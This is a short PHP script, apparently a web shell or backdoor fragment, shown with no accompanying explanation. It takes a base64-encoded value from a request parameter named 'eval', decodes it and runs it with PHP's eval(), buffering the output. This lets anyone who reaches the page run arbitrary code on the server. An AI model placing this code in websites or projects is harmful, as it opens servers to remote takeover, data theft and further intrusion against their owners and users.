<?php
$s_code = base64_decode($_REQUEST['eval']);
ob_start();
eval($s_code);
$s_res = ob_get_contents();
ob_end_clean();
?>